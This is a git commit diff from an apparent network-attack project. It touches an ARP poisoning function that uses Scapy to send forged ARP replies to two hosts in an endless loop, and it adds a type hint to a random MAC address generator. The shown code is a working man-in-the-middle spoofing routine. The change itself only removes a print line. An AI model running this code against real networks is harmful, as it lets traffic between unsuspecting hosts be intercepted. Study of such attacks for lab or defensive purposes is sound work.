b008b0ee141843570de4777dd86a3b36d0a26305
pepe <dani_rc_22@hotmail.com>
2023-03-12 22:08:42 -0300

    feat: attack leyer 2

--- attack/leyer_2/arp.py
+++ attack/leyer_2/arp.py
@@ -7,7 +7,6 @@ def arp_poison(ip_src: str, mac_src: str, ip_dst: str, mac_dst: str):
     arp_replay_1 = ARP(op=2, pdst=ip_dst, psrc=ip_src, hwdst=mac_dst)
     arp_replay_2 = ARP(op=2, pdst=ip_src, psrc=ip_dst, hwdst=mac_src)
     while True:
-        print('envenamiento: IP: ', ip_dst, ' MAC: ', mac_dst)
         send(arp_replay_1, verbose=False)
         send(arp_replay_2, verbose=False)
         sleep(2)
--- utils/mac.py
+++ utils/mac.py
@@ -1,7 +1,7 @@
 from random import randint
 
 
-def generate_mac_random():
+def generate_mac_random() -> str:
     mac_bytes = [randint(0x00, 0xff) for _ in range(6)]
     mac_bytes[0] &= 0xfe
     mac_address = ":".join(["{:02x}".format(b) for b in mac_bytes])
